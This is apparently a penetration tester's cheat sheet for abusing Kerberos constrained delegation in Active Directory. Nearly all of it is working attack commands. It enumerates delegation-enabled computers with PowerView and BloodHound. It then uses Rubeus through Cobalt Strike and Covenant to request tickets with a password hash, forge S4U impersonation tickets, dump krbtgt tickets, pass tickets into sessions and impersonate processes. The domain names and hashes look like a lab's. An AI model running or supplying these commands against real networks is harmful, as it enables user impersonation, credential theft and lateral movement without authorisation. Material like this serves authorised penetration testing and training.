## Powerview
```
Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
```
## BloodHound
```
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

## CobaltStrike --- user to host
```
execute-assembly C:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dbservice /domain:US.FUNCORP.LOCAL /rc4:6f9e22a64970f32bd0d86fddadc8b8b5
execute-assembly C:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:[username] /msdsspn:[AllowedToDelegateTo] /altservice:cifs /ptt  (This should allow psexec)
```

## Covenant --- host to host
```
Rubeus dump /service:krbtgt
Rubeus s4u /impersonateuser:[username]@[domain] /msdsspn:[AllowedToDelegateTo] /ticket:[...snip...]
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x239b995 /ticket:[...snip...]
ImpersonateProcess 3420
```

* plain text to NTML
```
Rubeus.exe hash /password:lab
```
